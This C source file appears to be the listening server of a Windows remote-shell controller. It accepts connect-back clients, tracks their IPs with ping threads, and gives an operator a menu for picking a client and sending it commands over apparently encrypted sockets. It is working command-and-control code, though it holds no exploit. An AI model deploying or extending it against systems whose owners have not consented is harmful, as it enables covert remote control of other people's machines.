#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>
#include <time.h>
#include <ctype.h>
#include <ws2tcpip.h>
#include <windows.h>

#include "main.h"
#include "cry_socket.h"

typedef struct {
	int exists;
	int index;
	SOCKET sock;
	char* ip;
	char* header;
	int port;
	HANDLE pingThread;
} CLIENT;

CLIENT clients[MAX_CONNS] = {0};
BOOL sessionIsActive = FALSE;
HANDLE thread_send = NULL;
HANDLE thread_recv = NULL;


BOOL running = TRUE;
BOOL writeToSTDOUT = TRUE;

SOCKET sock               = INVALID_SOCKET;
SOCKET sock_output        = INVALID_SOCKET;
SOCKET sock_output_client = INVALID_SOCKET;
SOCKET sock_debug         = INVALID_SOCKET;
SOCKET sock_debug_client  = INVALID_SOCKET;

SOCKET startServer(int port) {
	// Fill in the address structure
	struct sockaddr_in local;
	local.sin_family      = AF_INET;
	local.sin_addr.s_addr = INADDR_ANY;
	local.sin_port        = htons(port);
	
	SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == INVALID_SOCKET)                                               { fprintf(stderr, "ERROR: socket() failed\n");                 return INVALID_SOCKET; }
	if (bind(s, (struct sockaddr *)&local, sizeof(local)) == SOCKET_ERROR) { fprintf(stderr, "ERROR: bind() failed\n");   closesocket(s); return INVALID_SOCKET; }
	if (listen(s, SOMAXCONN) == SOCKET_ERROR)                              { fprintf(stderr, "ERROR: listen() failed\n"); closesocket(s); return INVALID_SOCKET; }
	return s;
}

DWORD WINAPI server_output_thread() {
	while (running) {
		// accept conn
		struct sockaddr_in client_addr;
		int addr_len = sizeof(client_addr);
		sock_output_client = accept(sock_output, (struct sockaddr*)&client_addr, &addr_len);
		if (sock_output_client == INVALID_SOCKET) { continue; }
		
		// send msg
		char buff[BIGSIZ] = {0};
		snprintf(buff, BIGSIZ, "OUTPUT: %d\n", sock_output_client);
		send(sock_output_client, buff, strlen(buff), 0);
		
		// check loop
		while (running) {
			Sleep(100);
			if (sock_output_client == INVALID_SOCKET) { break; }
		}
	}
	return 1;
}
void server_output(const char* buff) {
	int r = send(sock_output_client, buff, strlen(buff), 0);
	if (r == SOCKET_ERROR || r == 0) {
		closesocket(sock_output_client);
		sock_output_client = INVALID_SOCKET;
	}
}

DWORD WINAPI server_debug_thread() {
	while (running) {
		// accept conn
		struct sockaddr_in client_addr;
		int addr_len = sizeof(client_addr);
		sock_debug_client = accept(sock_debug, (struct sockaddr*)&client_addr, &addr_len);
		if (sock_debug_client == INVALID_SOCKET) { continue; }
		
		// send msg
		char buff[BIGSIZ] = {0};
		snprintf(buff, BIGSIZ, "DEBUG: %d\n", sock_debug_client);
		send(sock_debug_client, buff, strlen(buff), 0);
		
		// check loop
		while (running) {
			Sleep(100);
			if (sock_debug_client == INVALID_SOCKET) { break; }
		}
	}
	return 1;
}
void server_debug(const char* buff) {
	int r = send(sock_debug_client, buff, strlen(buff), 0);
	if (r == SOCKET_ERROR || r == 0) {
		closesocket(sock_debug_client);
		sock_debug_client = INVALID_SOCKET;
	}
}

DWORD WINAPI handleConnection(void*);
DWORD WINAPI menu();

BOOL strIsNum(const char* str) {
	for (size_t i = 0; i < strlen(str); i++) {
		if (!isdigit(str[i])) { return FALSE; }
	}
	return TRUE;
}

void client_remove(int i) {
	closesocket(clients[i].sock);
	clients[i].exists = 0;
	free(clients[i].ip);
	free(clients[i].header);
}
DWORD WINAPI ping_thread(void* data) {
	
	int i = (int)data;
	
	while (clients[i].exists) {
		char buff[BIGSIZ] = {0};
		snprintf(buff, BIGSIZ, "%s", PING_STRING);
		int r = sendE(clients[i].sock, buff, strlen(buff), 0);
		
		// send debug
		char buff2[BIGSIZ] = {0};
		snprintf(buff2, BIGSIZ, "[%ld] PING: %d : [%d] -- %s:%d -- %s\n", time(0), r, clients[i].index, clients[i].ip, clients[i].port, clients[i].header);
		server_debug(buff2);
		
		if (r == SOCKET_ERROR || r == 0) {
			char buff3[BIGSIZ] = {0};
			snprintf(buff3, BIGSIZ, "REMOVE: %d : (%s:%d)\n", clients[i].index, clients[i].ip, clients[i].port);
			server_debug(buff3);
			
			client_remove(i);
			break;
		}
		Sleep(PING_DELAY);
	} 
	
	return 1;
}
void client_add(SOCKET clientSocket, struct sockaddr_in client) {
	// find room
	for (int i = 0; i < MAX_CONNS; i++) {
		if (!clients[i].exists) {
			clients[i].exists = 1;
			clients[i].sock = clientSocket;
			clients[i].index = i;
			clients[i].ip = strdup(inet_ntoa(client.sin_addr));
			clients[i].port = ntohs(client.sin_port);
			clients[i].pingThread = CreateThread(NULL, 0, ping_thread, (void*)i, 0, NULL);
			
			char buff[BIGSIZ] = {0};
			int r = recvE(clients[i].sock, buff, BIGSIZ-1, 0);
			
			if (r == SOCKET_ERROR || r == 0) { clients[i].header = NULL; }
			else {
				if (buff[r-1] == '\n') { buff[r-1] = '\0'; }
				clients[i].header = strdup(buff);
			}
			
			printf("\r +[%d] -- %s:%d -- %s\n", clients[i].index, clients[i].ip, clients[i].port, clients[i].header);
			if (!sessionIsActive) printf("> ");
			break;
		}
	}
}
void client_removeAll() {
	for (int i = 0; i < MAX_CONNS; i++) {
		if (clients[i].exists) {
			client_remove(i);
		}
	}
}
int  client_isValid(int index) {
	for (int i = 0; i < MAX_CONNS; i++) {
		if (clients[i].exists && clients[i].index == index) { return TRUE; }
	}
	return FALSE;
}
void client_list() {
	int g = 1;
	for (int i = 0; i < MAX_CONNS; i++) {
		if (clients[i].exists) {
			printf("\r %d [%d] -- %s:%d -- %s\n", g++, clients[i].index, clients[i].ip, clients[i].port, clients[i].header);
		}
	}
}

void print_help() {
	printf("%s",
		"\n"
		" ===[ COMMANDS BEFORE CONNECTING ]===\n"
		"  h/help      - print help\n"
		"  c/cls/clear - clear screen\n"
		"  o/out       - redirect to this stdout to print shell recv\n"
		"  l/list      - list connections\n"
		"  e/q/exit    - exit from server\n"
		"  rm <index>  - remove connection\n"
		"  rmall       - remove all connections\n"
		"\n"
		" ===[ COMMANDS AFTER CONNECTING ]===\n"\
		"  cls  - clear screen\n"
		"  MENU - go back to the menu\n"
		"\n"
	);
}

DWORD WINAPI menu_thread_send(void* data) {
	int i = *((int*)data);
	
	while (clients[i].exists) {
		char buff[BIGSIZ] = {0};
		printf("# ");
		fgets(buff, BIGSIZ-1, stdin);
		if (!strcmp(buff, "MENU\n")) { break; }
		if (!strcmp(buff, "cls\n")) { system("cls"); memset(buff, 0, BIGSIZ); buff[0] = '\n'; }
		int r = sendE(clients[i].sock, buff, strlen(buff), 0);
		if (r == SOCKET_ERROR || r == 0) { break; }
	}
	
	TerminateThread(thread_recv, 0);
	return 1;
}

DWORD WINAPI menu_thread_recv(void* data) {
	int i = *((int*)data);
	
	while (clients[i].exists) {
		char buff[BIGSIZ] = {0};
		int r = recvE(clients[i].sock, buff, BIGSIZ-1, 0);
		if (r == SOCKET_ERROR || r == 0) { break; }
		if (r > 0) {
			if (writeToSTDOUT) { fwrite(buff, sizeof(char), r, stdout); } else { server_output(buff); }
		}
	}
	
	//TerminateThread(thread_send, 0); // can't do this... fgets gets angry :|
	// if the pipe breaks we'll need to tap ENTER a few times
	return 1;
}

BOOL menu_cmd_rm(const char* cmd_p) {
	const char* s = cmd_p;
	s += 3;
	
	if (!strIsNum(s)) {
		fprintf(stderr, "ERROR: invalid number\n");
		return FALSE;
	}
	
	int a = atoi(s);
	client_remove(a);
	return TRUE;
}

DWORD WINAPI menu() {
	
	while (running) {
		
		// get command
		printf("> ");
		char buff[BIGSIZ] = {0};
		fgets(buff, BIGSIZ-1, stdin);
		
		int r = strlen(buff);
		if (buff[r-1] == '\n') { buff[r-1] = '\0'; } // remove newline
		if (buff[0] == '\0') { continue; }
		
		// custom commands
		if (!strcmp(buff, "c") || !strcmp(buff, "cls") || !strcmp(buff, "clear")) { system("cls");    continue; }
		if (!strcmp(buff, "l") || !strcmp(buff, "list"))                          { client_list();    continue; }
		if (!strcmp(buff, "h") || !strcmp(buff, "help"))                          { print_help();     continue; }
		if (!strcmp(buff, "e") || !strcmp(buff, "q") || !strcmp(buff, "exit"))    { running = FALSE; closesocket(sock); break;  }
		if (!strcmp(buff, "o") || !strcmp(buff, "out"))                           { writeToSTDOUT = !writeToSTDOUT; printf("use STDOUT: %s\n", writeToSTDOUT ? "TRUE" : "FALSE"); continue; }
		if (!strcmp(buff, "rmall"))                                               { client_removeAll(); continue; }
		if (buff[0] == 'r' && buff[1] == 'm') { menu_cmd_rm(buff); continue; }
		
		int i = atoi(buff);
		if (!strIsNum(buff) || !client_isValid(i)) { fprintf(stderr, "ERROR: invalid socket index\n"); continue; }
		
		// print
		printf(">>> [%d] -- %s:%d\n", clients[i].index, clients[i].ip, clients[i].port);
		
		sessionIsActive = TRUE;
		
		// start threads
		thread_send = CreateThread(NULL, 0, menu_thread_send, (void*)&i, 0, NULL); if (!thread_send) { continue; }
		thread_recv = CreateThread(NULL, 0, menu_thread_recv, (void*)&i, 0, NULL); if (!thread_recv) { continue; }
		
		WaitForSingleObject(thread_send, INFINITE);
		//WaitForSingleObject(thread_recv, INFINITE);
		
		sessionIsActive = FALSE;
	}
	
	return 1;
}

int main() {
	
	printf(
		"\n"
		"     ................\n"
		"...::: SERVER BEGIN :::...\n"
		"==========================\n"
	);
	
	printf("PORT: %d\n> nc localhost %d -- output\n> nc localhost %d -- debug\n\n", HOST_PORT, HOST_PORT_OUTPUT, HOST_PORT_DEBUG);
	
	// initialize winsock
	WSADATA wsData;
	if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) { fprintf(stderr, "ERROR: failed to initialize winsock\n"); return 1; }
	
	// start menu thread
	if (!CreateThread(NULL, 0, menu, NULL, 0, NULL)) { fprintf(stderr, "ERROR: failed to start menu thread\n"); }
	
	while (running) {
		
		sock        = startServer(HOST_PORT);
		sock_output = startServer(HOST_PORT_OUTPUT);
		sock_debug  = startServer(HOST_PORT_DEBUG);
		
		if (!CreateThread(NULL, 0, server_output_thread, NULL, 0, NULL)) { fprintf(stderr, "ERROR: failed to start server_output_thread\n"); }
		if (!CreateThread(NULL, 0, server_debug_thread, NULL, 0, NULL)) { fprintf(stderr, "ERROR: failed to start server_debug_thread\n"); }
		
		while (running) {
			struct sockaddr_in client_addr;
			int addr_len = sizeof(client_addr);
			SOCKET clientSocket = accept(sock, (struct sockaddr*)&client_addr, &addr_len);
			if (!running) { break; }
			if (clientSocket == INVALID_SOCKET) { fprintf(stderr, "ERROR: accept() failed\n"); break; }
			client_add(clientSocket, client_addr);
		}
		
		client_removeAll();
		closesocket(sock);
	}
	
	WSACleanup();
	
	return 0;
}